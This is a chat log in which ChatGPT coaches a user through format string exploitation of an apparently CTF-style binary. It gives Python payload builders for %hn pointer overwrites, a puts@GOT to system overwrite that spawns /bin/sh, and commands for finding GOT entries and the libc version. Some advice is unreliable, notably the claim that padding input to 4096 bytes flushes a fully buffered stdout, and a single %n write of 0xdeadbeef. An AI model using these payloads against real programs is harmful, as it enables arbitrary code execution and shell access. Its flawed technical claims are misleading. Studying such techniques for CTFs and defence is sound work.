how to change what something is pointing at in a format string exploit
ChatGPT said:
ChatGPT
In a format string exploit, you manipulate the format specifiers to read from or write to specific memory addresses. If you want to change what a specific variable, pointer, or memory location is pointing at, you typically aim to write a new value to that memory location using the %n specifier.

Here’s how you can approach it:

1. Understand the Format String Vulnerability
The format string vulnerability occurs when untrusted input is passed directly to a function like printf without a proper format specifier. For example:
c
Copy code
printf(user_input);  // Vulnerable code
This allows an attacker to control the format string and potentially read or write arbitrary memory.
2. Find the Memory Location You Want to Change
Identify the address of the variable or pointer you want to modify. This is typically found using tools like gdb or through static analysis.
For example, if you want to change the value of int *ptr, find the memory address of ptr.
3. Overwrite the Target Memory with %n
The %n format specifier writes the number of characters output so far to a specified memory address.
To overwrite a specific address:
Place the target address in a writable section of memory (e.g., on the stack or in the input itself).
Adjust the number of characters printed to match the desired value.
Use %n to write that value to the target address.
4. Craft the Exploit
Suppose you want to change ptr (at address 0x0804a028) to point to 0xdeadbeef. Here's an example:

Input Memory Layout: Place 0x0804a028 in the payload. This ensures the address is available for %n to write to:

javascript
Copy code
"AAAA" + "BBBB" + <address of ptr>
Print Controlled Output: Use padding to write 0xdeadbeef in chunks. For example, using short writes (%hn):

Split 0xdeadbeef into two parts: 0xdead (high) and 0xbeef (low).
Write these values in two steps.
Payload structure:

python
Copy code
payload = b""
payload += p32(0x0804a028)      # Low bytes address
payload += p32(0x0804a02a)      # High bytes address
payload += f"%{value1}x%7$hn".encode()  # Adjust value1
payload += f"%{value2}x%8$hn".encode()  # Adjust value2
5. Test the Exploit
Run the program in a controlled environment (e.g., gdb or a sandbox) to verify the address is updated as expected.
Notes
Alignment Matters: Ensure the stack alignment matches your exploit layout.
Write Constraints: %n writes based on the number of characters printed, so the size might be limited by the precision specifier (%hn for short, %hhn for a single byte, %n for 4 bytes).
Mitigation Bypasses: Ensure you account for modern defenses like ASLR, stack canaries, and PIE.

how would you do it if they used setvbuf
ChatGPT said:
ChatGPT
If the program uses setvbuf, it means the input/output buffering behavior of the program is being altered. setvbuf can impact how inputs and outputs are handled in terms of timing and memory, but it doesn't fundamentally change the exploitation process. However, it can introduce challenges depending on its mode:

Modes of setvbuf
_IONBF (Unbuffered):
No buffering; output is written immediately.
Easier to work with because you see the effects of your exploit immediately.
_IOLBF (Line Buffered):
Output is written when a newline (\n) is encountered.
May require you to append a newline to your payload for immediate effect.
_IOFBF (Fully Buffered):
Output is written only when the buffer is full.
Can delay the effects of your exploit, as you might need to fill the buffer or flush it explicitly with fflush.
Adjustments for setvbuf
1. Inspect Buffering Behavior
Determine the setvbuf mode by analyzing the code or observing runtime behavior. Look for calls like:
c
Copy code
setvbuf(stdout, NULL, _IOLBF, 0);  // Line buffered
If the code isn’t available, observe the program:
Does it immediately print after every input? (_IONBF or _IOLBF)
Does it delay output? (_IOFBF)
2. Modify the Payload for Buffering
For _IONBF:

No special adjustments are required, as data is written immediately.
For _IOLBF:

Ensure your payload ends with a newline (\n) to trigger the output.
For _IOFBF:

If output is delayed, fill the buffer to force a flush. The default buffer size is typically BUFSIZ (e.g., 4096 bytes).
Add padding to your payload to fill the buffer:
python
Copy code
payload = b"A" * 4096 + crafted_exploit
3. Handle Exploitation
Once the buffering behavior is managed, proceed with your format string exploit as usual:

Target Address Injection: Place the target address (e.g., 0x0804a028) in the buffer.
Controlled Output: Use format specifiers (%n, %hn, %hhn) to overwrite the memory.
Example Exploit Adjusted for setvbuf
Assume the program uses _IOFBF:
Buffer Size:

If BUFSIZ is 4096 bytes, you’ll need to craft a payload to fill the buffer and include your format string at the end.
Payload Construction:

python
Copy code
buffer_size = 4096
address = 0x0804a028  # Target address
value = 0xdeadbeef

# Fill the buffer
padding = b"A" * (buffer_size - 16)

# Address placement
payload = padding
payload += p32(address)  # Write the target address

# Add format string
payload += f"%{value}x%7$n".encode()
Trigger Buffer Flush:

The payload itself should fill the buffer and cause the program to flush it.
If it doesn’t flush automatically, you may need to interact further to trigger the flush (e.g., inputting additional data or forcing an event like fflush(stdout)).
Debugging Tips
Use tools like gdb or strace to monitor program behavior.
Test with small payloads to understand how setvbuf affects the input/output.

if it is unbuffed how would you use format strings to change the address of something to open a shell when /bin/sh is stored as a global variable in the code
ChatGPT said:
ChatGPT
If the program is unbuffered (setvbuf with _IONBF), the input and output occur immediately, making it easier to observe the effects of your payload in real-time. When using a format string exploit to overwrite the address of a variable to point to /bin/sh (stored as a global variable), you typically need to:

Locate the Global Variable's Address:

Identify the memory address of the global variable that holds /bin/sh. For example:
c
Copy code
char *shell = "/bin/sh";
Use tools like gdb to find its address:
css
Copy code
p &shell
Find the Target Address to Overwrite:

Determine the address of the variable or pointer you want to redirect to /bin/sh. For example, if there’s a pointer char *target used in a system() call:
c
Copy code
char *target;
system(target);
Your goal is to overwrite target with the address of shell.
Craft the Format String Payload:

The payload should:
Write the address of shell into target.
Use the %n specifier to perform the overwrite.
Steps to Construct the Exploit
Example Memory Layout
Assume:

Address of target = 0x0804a028
Address of shell = 0x0804b000
1. Write in Chunks with %hn or %hhn
Writing 0x0804b000 directly with %n is tricky because it’s a large value. Instead, split it into smaller chunks:

High Bytes (0x0804): Stored in target + 2
Low Bytes (0xb000): Stored in target
2. Payload Layout
Construct a payload like this:

Write the low bytes (0xb000) to target.
Write the high bytes (0x0804) to target + 2.
Here’s a breakdown:

Place the addresses of target and target + 2 in the payload.
Use format string specifiers to print the required number of characters for each write.
3. Payload Construction in Python
python
Copy code
from struct import pack

# Addresses
target = 0x0804a028  # Address of the pointer to overwrite
shell = 0x0804b000   # Address of "/bin/sh"

# Split the target address
low = shell & 0xffff       # 0xb000
high = (shell >> 16) & 0xffff  # 0x0804

# Payload structure
payload = b""
payload += pack("<I", target)       # Address to write low bytes
payload += pack("<I", target + 2)   # Address to write high bytes

# Adjust padding for low bytes
padding_low = low - len(payload)
payload += f"%{padding_low}x".encode()  # Print up to `low` bytes
payload += b"%7$hn"                     # Write low bytes to `target`

# Adjust padding for high bytes
padding_high = high - low
payload += f"%{padding_high}x".encode()  # Print up to `high` bytes
payload += b"%8$hn"                      # Write high bytes to `target + 2`
4. Test the Exploit
Run the program with the payload as input and observe its behavior.
Use gdb to verify if the address of target is updated to point to /bin/sh.
Result
After successful exploitation:

target points to /bin/sh.
When system(target) is called, it spawns a shell.
Notes
Ensure the stack alignment matches your payload.
If the program has mitigations like ASLR, bypass them or use a relative overwrite technique.
Use tools like gdb or pwndbg to debug and refine your payload.

can I change it so that the puts command points at the system command using format strings exploit
ChatGPT said:
ChatGPT
Yes, you can use a format string exploit to overwrite the Global Offset Table (GOT) entry for puts to redirect it to system. This is a common technique in format string exploitation, as it hijacks the function pointer used by dynamically linked functions.

Here’s how to achieve it:

Goal
Redirect puts to system so that any call to puts("/bin/sh") effectively executes system("/bin/sh").

Prerequisites
Addresses Needed:

Address of puts@GOT: This is the GOT entry for puts, where its runtime address is resolved.
Address of system: The address of the system function in the binary or libc.
Tools:

Use readelf -r binary or objdump -R binary to find the address of puts@GOT.
Use tools like gdb or libc-database to locate the address of system.
Steps
1. Identify puts@GOT and system Addresses
For example:

puts@GOT: 0x0804a00c
system: 0xf7e12450
2. Split the system Address
The system address (0xf7e12450) needs to be written in two parts:

Low 2 bytes: 0x2450
High 2 bytes: 0xf7e1
Write these values to consecutive memory locations (puts@GOT and puts@GOT + 2).

3. Craft the Format String Payload
Memory Layout:

Place puts@GOT and puts@GOT + 2 in the payload.
Write the Low Bytes:

Use %n, %hn, or %hhn to write 0x2450 to puts@GOT.
Write the High Bytes:

Use %n, %hn, or %hhn to write 0xf7e1 to puts@GOT + 2.
Example Exploit Payload
Here’s a Python script to create the payload:

python
Copy code
from struct import pack

# Addresses
puts_got = 0x0804a00c  # Address of puts@GOT
system = 0xf7e12450    # Address of system()

# Split the system address into low and high parts
low = system & 0xffff       # 0x2450
high = (system >> 16) & 0xffff  # 0xf7e1

# Ensure `high > low` for correct padding calculation
if low > high:
    low, high = high, low
    puts_got, puts_got2 = puts_got + 2, puts_got
else:
    puts_got2 = puts_got + 2

# Start crafting the payload
payload = b""
payload += pack("<I", puts_got)       # Address to write low bytes
payload += pack("<I", puts_got2)      # Address to write high bytes

# Add the padding for low bytes
padding_low = low - len(payload)
payload += f"%{padding_low}x".encode()  # Print enough characters for `low`
payload += b"%7$hn"                     # Write low bytes to `puts@GOT`

# Add the padding for high bytes
padding_high = high - low
payload += f"%{padding_high}x".encode()  # Print enough characters for `high`
payload += b"%8$hn"                      # Write high bytes to `puts@GOT + 2`

print(payload)
4. Test the Exploit
Run the program in gdb or a controlled environment with the payload.
Verify that the puts@GOT entry has been modified to point to system:
bash
Copy code
x/wx 0x0804a00c
It should now contain 0xf7e12450.
Execution
Once the GOT entry for puts points to system, calling puts("/bin/sh") will effectively execute:

c
Copy code
system("/bin/sh");
Tips
Stack Alignment: Ensure the offsets for %7$hn and %8$hn match your payload's position on the stack. Use tools like gdb or a trial-and-error approach to determine the correct offset.
ASLR Bypass: If ASLR is enabled, you’ll need to leak the libc base address first using the format string vulnerability.

how to see what libc type a file is
ChatGPT said:
ChatGPT
To determine the type or version of the libc a binary is using, you can analyze the binary itself or its runtime behavior. Here's how to do it:

1. Check for a Direct libc Dependency
Use ldd
Run ldd on the binary to see the linked shared libraries, including libc:

bash
Copy code
ldd ./binary
This will output something like:

bash
Copy code
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x7f1234567000)
Here, libc.so.6 is the version of libc being used.

Identify the Library Version
Once you have the path to the libc file (e.g., /lib/x86_64-linux-gnu/libc.so.6), you can check its version:

bash
Copy code
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GLIBC"
This outputs the version of glibc:

Copy code
GLIBC_2.28
GLIBC_2.31
2. Use file Command
The file command provides basic information about the binary and its linked libc:

bash
Copy code
file ./binary
The output might indicate the libc type indirectly:

arduino
Copy code
./binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=..., stripped
If the binary is dynamically linked, it will use a shared libc.

3. Analyze with readelf
readelf can be used to examine the binary’s dynamic section for linked libraries:

bash
Copy code
readelf -d ./binary | grep NEEDED
Look for a line indicating the dependency on libc.so.6:

less
Copy code
0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
4. Examine the Binary with strings
Search for libc or GLIBC versions directly in the binary:

bash
Copy code
strings ./binary | grep "GLIBC"
This may reveal the version of libc it was compiled or linked against.

5. Dump Symbols with objdump
To see which symbols the binary uses from libc, run:

bash
Copy code
objdump -T ./binary | grep libc
This shows symbols resolved from libc.

6. Determine libc Version at Runtime
Run the binary in a controlled environment and inspect which libc it loads:

bash
Copy code
ldd ./binary
or use ltrace to monitor runtime library calls:

bash
Copy code
ltrace ./binary
7. Use the libc-database Project
If you are trying to identify an exact libc version for exploitation:

Dump a known libc function's address from memory (e.g., puts or system) and the libc base address.
Use these offsets with the libc-database project to identify the specific version:
Install libc-database:
bash
Copy code
git clone https://github.com/niklasb/libc-database.git
cd libc-database
Search for your libc version:
bash
Copy code
./find system 0xf7e12450 puts 0xf7e09450
Summary
Use ldd to see the linked libc.
Use strings or readelf to identify specific versions.
Use libc-database for exploitation purposes.
Let me know if you'd like help with a specific binary!

where is put@got in the libc libray
ChatGPT said:
ChatGPT
The puts@GOT entry is not inside the libc library itself. Instead, it resides in the Global Offset Table (GOT) of the binary that calls puts. The GOT is part of the binary's memory, not the libc library, and it holds the runtime-resolved addresses of dynamically linked functions like puts, printf, etc.

Here's how it works and how you can find it:

Where is puts@GOT?
In the binary's memory:
The GOT entry for puts stores the address of the puts function in the libc library after the dynamic linker resolves it.
Initially, before the linker resolves it, the GOT entry points to the Procedure Linkage Table (PLT).
Steps to Locate puts@GOT
1. Use readelf to Find GOT Entries
You can locate the puts@GOT entry in the binary using readelf:

bash
Copy code
readelf -r ./binary | grep puts
This shows the relocation entry for puts:

c
Copy code
00002020  00000707 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
Here, 0x2020 (or 0x0804a020 in a 32-bit binary) is the address of puts@GOT.

2. Use objdump to Inspect the GOT
Use objdump to disassemble and locate the GOT entry for puts:

bash
Copy code
objdump -R ./binary | grep puts
The output will be similar:

c
Copy code
0804a00c R_386_JUMP_SLOT   puts
This confirms that puts@GOT is at 0x0804a00c.

3. Examine with gdb
If you’re debugging the binary, use gdb to confirm the runtime address of puts@GOT:

Start the binary in gdb:

bash
Copy code
gdb ./binary
Disassemble the PLT to find the GOT entry:

bash
Copy code
disassemble puts@plt
You’ll see an instruction like:

css
Copy code
jmp DWORD PTR [0x0804a00c]
The address in the square brackets (0x0804a00c) is the GOT entry for puts.

Inspect the GOT entry to confirm its contents:

bash
Copy code
x/wx 0x0804a00c
This will show the resolved address of puts in libc after it is called.

What Does puts@GOT Contain?
Before Resolution:
Initially, puts@GOT points to the puts@PLT entry in the binary, which calls the dynamic linker (ld.so).
After Resolution:
Once resolved, puts@GOT contains the actual address of the puts function in the libc library.
Where is puts in libc?
If you want to locate the puts function inside libc:

Use nm or readelf to inspect the symbols in libc:

bash
Copy code
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep puts
Output:

c
Copy code
00067a30 T puts
This indicates puts is at offset 0x67a30 within libc.

Add this offset to the base address of libc in memory to get the runtime address of puts.

Practical Use
If you’re performing an exploit:

Overwrite puts@GOT to point to system in libc.
Afterward, any call to puts("/bin/sh") will effectively call system("/bin/sh").
Let me know if you’d like help constructing an exploit with this information!
